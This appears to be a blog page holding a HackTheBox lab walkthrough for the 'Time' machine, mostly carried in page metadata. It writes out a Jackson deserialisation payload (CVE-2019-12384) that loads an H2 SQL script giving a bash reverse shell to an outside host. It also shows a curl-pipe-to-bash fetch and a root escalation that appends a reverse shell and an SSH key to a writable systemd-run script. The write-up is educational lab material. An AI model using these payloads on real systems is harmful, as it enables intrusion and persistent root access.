<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="HTB - Time" /><meta name="author" content="QTranspose" /><meta property="og:locale" content="en_US" /><meta name="description" content="Time is a vulnerable virtual machine created by egotisticalSW &amp; felamos on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, we see that this is a Linux machine running SSH and HTTP services. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ nmap-default 10.10.10.214 Nmap scan report for 10.10.10.214 Host is up (0.19s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA) | 256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA) |_ 256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Online JSON parser Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel The version of the system can be identified by searching for the OpenSSH package information. It appears to be Ubuntu 20.04 (Focal Fossa) according to the page below. https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4ubuntu0.1 HTTP The following web page is found as the index page of the HTTP server, which appears to beautify and validate JSON data. An error message is obtained by trying some invalid JSON object with the “Validate” functionality. In the message, we notice that com.fasterxml.jackson.core is the package used to process the data. 1 Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token &#39;test&#39;: was expecting &#39;null&#39;, &#39;true&#39;, &#39;false&#39; or NaN Exploitation CVE-2019-12384 The package has a lot of vulnerabilities. After quite a bit of searching and trial &amp; error, a working exploit is found in this blog post. First, an inject.sql file containing the below contents is created and served with Python HTTP server. 1 2 3 4 5 6 CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { String[] command = {&quot;bash&quot;, &quot;-c&quot;, cmd}; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(&quot;\\A&quot;); return s.hasNext() ? s.next() : &quot;&quot;; } $$; CALL SHELLEXEC(&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.8/4444 0&gt;&amp;1&#39;) Next, the following payload is used against the page’s “validate” function to trigger the deserialisation vulnerability, which in turn makes the server do an SSRF to fetch and execute our malicious SQL code. 1 [&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, {&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://10.10.14.8:8000/inject.sql&#39;&quot;}] It is confirmed in our Python HTTP server. 1 2 3 $ python -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.10.214 - - [03/Apr/2021 23:49:14] &quot;GET /inject.sql HTTP/1.1&quot; 200 - Checking the ncat listener, we get a reverse shell as pericles. 1 2 3 4 5 6 7 $ ncat -nlvp 4444 ... pericles@time:/var/www/html$ whoami whoami pericles Privilege Escalation Some enumeration is performed with LinPEAS. This can be done by putting the linpeas.sh in the Python HTTP server directory and execute the following command in the reverse shell. 1 pericles@time:/var/www/html$ curl 10.10.14.8:8000/linpeas.sh | bash In the System timers section of the outputs, something interesting is found. For some readings about systemd timers, refer to here. 1 2 3 4 [+] System timers [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers NEXT LEFT LAST PASSED UNIT ACTIVATES Sun 2021-04-04 03:53:11 UTC 2s left Sun 2021-04-04 03:53:01 UTC 7s ago timer_backup.timer timer_backup.service The timer is found to be executing a service named timer_backup.service, which in turn runs another service web_backup.service. 1 2 3 4 5 6 7 8 9 10 11 pericles@time:/var/www/html$ find / -name timer_backup.service 2&gt;/dev/null /etc/systemd/system/timer_backup.service pericles@time:/var/www/html$ cat /etc/systemd/system/timer_backup.service [Unit] Description=Calls website backup Wants=timer_backup.timer WantedBy=multi-user.target [Service] ExecStart=/usr/bin/systemctl restart web_backup.service The web_backup.service just runs a shell script /usr/bin/timer_backup.sh. 1 2 3 4 5 6 pericles@time:/var/www/html$ cat /etc/systemd/system/web_backup.service [Unit] Description=Creates backups of the website [Service] ExecStart=/bin/bash /usr/bin/timer_backup.sh The shell script does some backup job as the name suggests. However, by checking the permissions of the file, it is found to be owned by our current user and writable by anyone, which means that we can control the content of the script. 1 2 3 4 5 6 pericles@time:/var/www/html$ cat /usr/bin/timer_backup.sh #!/bin/bash zip -r website.bak.zip /var/www/html &amp;&amp; mv website.bak.zip /root/backup.zip pericles@time:/var/www/html$ ls -l /usr/bin/timer_backup.sh -rwxrw-rw- 1 pericles pericles 88 Apr 4 04:05 /usr/bin/timer_backup.sh Since the script is executed by systemd and as root, we can simply put a reverse shell one-liner in it to get a reverse shell as root. 1 pericles@time:/var/www/html$ echo &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.8/4444 0&gt;&amp;1&#39; &gt;&gt; /usr/bin/timer_backup.sh It is confirmed by checking our ncat listener. But after a few seconds, the reverse shell dies, which makes it unusable. 1 2 3 4 5 6 7 $ ncat -nlvp 4444 ... root@time:/# whoami whoami root To get a stable shell, we can use ssh. First, an ssh key named root is generated with ssh-keygen. 1 $ ssh-keygen -t ed25519 -f root Next, we put a command that writes our public key into root’s authorized_keys in the shell script. 1 2 3 4 $ cat root.pub ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG7KYkSEthZfyCg4JkhAPAxW7bMlweV2iEvj9sSpUQjO pericles@time:/var/www/html$ echo &#39;echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG7KYkSEthZfyCg4JkhAPAxW7bMlweV2iEvj9sSpUQjO &gt;&gt; /root/.ssh/authorized_keys&#39; &gt;&gt; /usr/bin/timer_backup.sh After a few seconds, we can ssh in with the private key. 1 2 3 4 5 6 $ ssh -i root root@10.10.10.214 ... root@time:~# whoami root" /><meta property="og:description" content="Time is a vulnerable virtual machine created by egotisticalSW &amp; felamos on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, we see that this is a Linux machine running SSH and HTTP services. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ nmap-default 10.10.10.214 Nmap scan report for 10.10.10.214 Host is up (0.19s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA) | 256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA) |_ 256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Online JSON parser Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel The version of the system can be identified by searching for the OpenSSH package information. It appears to be Ubuntu 20.04 (Focal Fossa) according to the page below. https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4ubuntu0.1 HTTP The following web page is found as the index page of the HTTP server, which appears to beautify and validate JSON data. An error message is obtained by trying some invalid JSON object with the “Validate” functionality. In the message, we notice that com.fasterxml.jackson.core is the package used to process the data. 1 Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token &#39;test&#39;: was expecting &#39;null&#39;, &#39;true&#39;, &#39;false&#39; or NaN Exploitation CVE-2019-12384 The package has a lot of vulnerabilities. After quite a bit of searching and trial &amp; error, a working exploit is found in this blog post. First, an inject.sql file containing the below contents is created and served with Python HTTP server. 1 2 3 4 5 6 CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { String[] command = {&quot;bash&quot;, &quot;-c&quot;, cmd}; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(&quot;\\A&quot;); return s.hasNext() ? s.next() : &quot;&quot;; } $$; CALL SHELLEXEC(&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.8/4444 0&gt;&amp;1&#39;) Next, the following payload is used against the page’s “validate” function to trigger the deserialisation vulnerability, which in turn makes the server do an SSRF to fetch and execute our malicious SQL code. 1 [&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, {&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://10.10.14.8:8000/inject.sql&#39;&quot;}] It is confirmed in our Python HTTP server. 1 2 3 $ python -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.10.214 - - [03/Apr/2021 23:49:14] &quot;GET /inject.sql HTTP/1.1&quot; 200 - Checking the ncat listener, we get a reverse shell as pericles. 1 2 3 4 5 6 7 $ ncat -nlvp 4444 ... pericles@time:/var/www/html$ whoami whoami pericles Privilege Escalation Some enumeration is performed with LinPEAS. This can be done by putting the linpeas.sh in the Python HTTP server directory and execute the following command in the reverse shell. 1 pericles@time:/var/www/html$ curl 10.10.14.8:8000/linpeas.sh | bash In the System timers section of the outputs, something interesting is found. For some readings about systemd timers, refer to here. 1 2 3 4 [+] System timers [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers NEXT LEFT LAST PASSED UNIT ACTIVATES Sun 2021-04-04 03:53:11 UTC 2s left Sun 2021-04-04 03:53:01 UTC 7s ago timer_backup.timer timer_backup.service The timer is found to be executing a service named timer_backup.service, which in turn runs another service web_backup.service. 1 2 3 4 5 6 7 8 9 10 11 pericles@time:/var/www/html$ find / -name timer_backup.service 2&gt;/dev/null /etc/systemd/system/timer_backup.service pericles@time:/var/www/html$ cat /etc/systemd/system/timer_backup.service [Unit] Description=Calls website backup Wants=timer_backup.timer WantedBy=multi-user.target [Service] ExecStart=/usr/bin/systemctl restart web_backup.service The web_backup.service just runs a shell script /usr/bin/timer_backup.sh. 1 2 3 4 5 6 pericles@time:/var/www/html$ cat /etc/systemd/system/web_backup.service [Unit] Description=Creates backups of the website [Service] ExecStart=/bin/bash /usr/bin/timer_backup.sh The shell script does some backup job as the name suggests. However, by checking the permissions of the file, it is found to be owned by our current user and writable by anyone, which means that we can control the content of the script. 1 2 3 4 5 6 pericles@time:/var/www/html$ cat /usr/bin/timer_backup.sh #!/bin/bash zip -r website.bak.zip /var/www/html &amp;&amp; mv website.bak.zip /root/backup.zip pericles@time:/var/www/html$ ls -l /usr/bin/timer_backup.sh -rwxrw-rw- 1 pericles pericles 88 Apr 4 04:05 /usr/bin/timer_backup.sh Since the script is executed by systemd and as root, we can simply put a reverse shell one-liner in it to get a reverse shell as root. 1 pericles@time:/var/www/html$ echo &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.8/4444 0&gt;&amp;1&#39; &gt;&gt; /usr/bin/timer_backup.sh It is confirmed by checking our ncat listener. But after a few seconds, the reverse shell dies, which makes it unusable. 1 2 3 4 5 6 7 $ ncat -nlvp 4444 ... root@time:/# whoami whoami root To get a stable shell, we can use ssh. First, an ssh key named root is generated with ssh-keygen. 1 $ ssh-keygen -t ed25519 -f root Next, we put a command that writes our public key into root’s authorized_keys in the shell script. 1 2 3 4 $ cat root.pub ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG7KYkSEthZfyCg4JkhAPAxW7bMlweV2iEvj9sSpUQjO pericles@time:/var/www/html$ echo &#39;echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG7KYkSEthZfyCg4JkhAPAxW7bMlweV2iEvj9sSpUQjO &gt;&gt; /root/.ssh/authorized_keys&#39; &gt;&gt; /usr/bin/timer_backup.sh After a few seconds, we can ssh in with the private key. 1 2 3 4 5 6 $ ssh -i root root@10.10.10.214 ... root@time:~# whoami root" /><link rel="canonical" href="https://qtranspose.xyz/posts/htb-time/" /><meta property="og:url" content="https://qtranspose.xyz/posts/htb-time/" /><meta property="og:site_name" content="QTranspose" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-04-04T00:00:00+11:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HTB - Time" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@QTranspose" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Time is a vulnerable virtual machine created by egotisticalSW &amp; felamos on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, we see that this is a Linux machine running SSH and HTTP services. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ nmap-default 10.10.10.214 Nmap scan report for 10.10.10.214 Host is up (0.19s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA) | 256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA) |_ 256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Online JSON parser Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel The version of the system can be identified by searching for the OpenSSH package information. It appears to be Ubuntu 20.04 (Focal Fossa) according to the page below. https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4ubuntu0.1 HTTP The following web page is found as the index page of the HTTP server, which appears to beautify and validate JSON data. An error message is obtained by trying some invalid JSON object with the “Validate” functionality. In the message, we notice that com.fasterxml.jackson.core is the package used to process the data. 1 Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token &#39;test&#39;: was expecting &#39;null&#39;, &#39;true&#39;, &#39;false&#39; or NaN Exploitation CVE-2019-12384 The package has a lot of vulnerabilities. After quite a bit of searching and trial &amp; error, a working exploit is found in this blog post. First, an inject.sql file containing the below contents is created and served with Python HTTP server. 1 2 3 4 5 6 CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { String[] command = {&quot;bash&quot;, &quot;-c&quot;, cmd}; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(&quot;\\\\A&quot;); return s.hasNext() ? s.next() : &quot;&quot;; } $$; CALL SHELLEXEC(&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.8/4444 0&gt;&amp;1&#39;) Next, the following payload is used against the page’s “validate” function to trigger the deserialisation vulnerability, which in turn makes the server do an SSRF to fetch and execute our malicious SQL code. 1 [&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, {&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://10.10.14.8:8000/inject.sql&#39;&quot;}] It is confirmed in our Python HTTP server. 1 2 3 $ python -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.10.214 - - [03/Apr/2021 23:49:14] &quot;GET /inject.sql HTTP/1.1&quot; 200 - Checking the ncat listener, we get a reverse shell as pericles. 1 2 3 4 5 6 7 $ ncat -nlvp 4444 ... pericles@time:/var/www/html$ whoami whoami pericles Privilege Escalation Some enumeration is performed with LinPEAS. This can be done by putting the linpeas.sh in the Python HTTP server directory and execute the following command in the reverse shell. 1 pericles@time:/var/www/html$ curl 10.10.14.8:8000/linpeas.sh | bash In the System timers section of the outputs, something interesting is found. For some readings about systemd timers, refer to here. 1 2 3 4 [+] System timers [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers NEXT LEFT LAST PASSED UNIT ACTIVATES Sun 2021-04-04 03:53:11 UTC 2s left Sun 2021-04-04 03:53:01 UTC 7s ago timer_backup.timer timer_backup.service The timer is found to be executing a service named timer_backup.service, which in turn runs another service web_backup.service. 1 2 3 4 5 6 7 8 9 10 11 pericles@time:/var/www/html$ find / -name timer_backup.service 2&gt;/dev/null /etc/systemd/system/timer_backup.service pericles@time:/var/www/html$ cat /etc/systemd/system/timer_backup.service [Unit] Description=Calls website backup Wants=timer_backup.timer WantedBy=multi-user.target [Service] ExecStart=/usr/bin/systemctl restart web_backup.service The web_backup.service just runs a shell script /usr/bin/timer_backup.sh. 1 2 3 4 5 6 pericles@time:/var/www/html$ cat /etc/systemd/system/web_backup.service [Unit] Description=Creates backups of the website [Service] ExecStart=/bin/bash /usr/bin/timer_backup.sh The shell script does some backup job as the name suggests. However, by checking the permissions of the file, it is found to be owned by our current user and writable by anyone, which means that we can control the content of the script. 1 2 3 4 5 6 pericles@time:/var/www/html$ cat /usr/bin/timer_backup.sh #!/bin/bash zip -r website.bak.zip /var/www/html &amp;&amp; mv website.bak.zip /root/backup.zip pericles@time:/var/www/html$ ls -l /usr/bin/timer_backup.sh -rwxrw-rw- 1 pericles pericles 88 Apr 4 04:05 /usr/bin/timer_backup.sh Since the script is executed by systemd and as root, we can simply put a reverse shell one-liner in it to get a reverse shell as root. 1 pericles@time:/var/www/html$ echo &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.8/4444 0&gt;&amp;1&#39; &gt;&gt; /usr/bin/timer_backup.sh It is confirmed by checking our ncat listener. But after a few seconds, the reverse shell dies, which makes it unusable. 1 2 3 4 5 6 7 $ ncat -nlvp 4444 ... root@time:/# whoami whoami root To get a stable shell, we can use ssh. First, an ssh key named root is generated with ssh-keygen. 1 $ ssh-keygen -t ed25519 -f root Next, we put a command that writes our public key into root’s authorized_keys in the shell script. 1 2 3 4 $ cat root.pub ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG7KYkSEthZfyCg4JkhAPAxW7bMlweV2iEvj9sSpUQjO pericles@time:/var/www/html$ echo &#39;echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG7KYkSEthZfyCg4JkhAPAxW7bMlweV2iEvj9sSpUQjO &gt;&gt; /root/.ssh/authorized_keys&#39; &gt;&gt; /usr/bin/timer_backup.sh After a few seconds, we can ssh in with the private key. 1 2 3 4 5 6 $ ssh -i root root@10.10.10.214 ... root@time:~# whoami root","@type":"BlogPosting","headline":"HTB - Time","dateModified":"2021-05-16T17:13:00+10:00","datePublished":"2021-04-04T00:00:00+11:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://qtranspose.xyz/posts/htb-time/"},"author":{"@type":"Person","name":"QTranspose"},"url":"https://qtranspose.xyz/posts/htb-time/","@context":"https://schema.org"}</script><title>HTB - Time | QTranspose</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/qtranspose.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">QTranspose</a></div><div class="site-subtitle font-italic">Rock The Matrix</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/QTranspose" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://app.hackthebox.eu/profile/112476" aria-label="hackthebox" class="order-4" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HTB - Time</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HTB - Time</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Apr 4, 2021, 12:00 AM +1100" > Apr 4 <i class="unloaded">2021-04-04T00:00:00+11:00</i> </span> by <span class="author"> QTranspose </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, May 16, 2021, 5:13 PM +1000" > May 16 <i class="unloaded">2021-05-16T17:13:00+10:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="810 words">4 min</span></div></div><div class="post-content"><p>Time is a vulnerable virtual machine created by egotisticalSW &amp; felamos on HackTheBox. In this post, we document a complete walkthrough of pwning this machine.</p><h2 id="enumeration">Enumeration</h2><h3 id="nmap">Nmap</h3><p>Starting off with the <code class="language-plaintext highlighter-rouge">nmap</code> scan, we see that this is a Linux machine running <code class="language-plaintext highlighter-rouge">SSH</code> and <code class="language-plaintext highlighter-rouge">HTTP</code> services.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>$ nmap-default 10.10.10.214

Nmap scan report for 10.10.10.214
Host is up (0.19s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA)
|   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA)
|_  256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
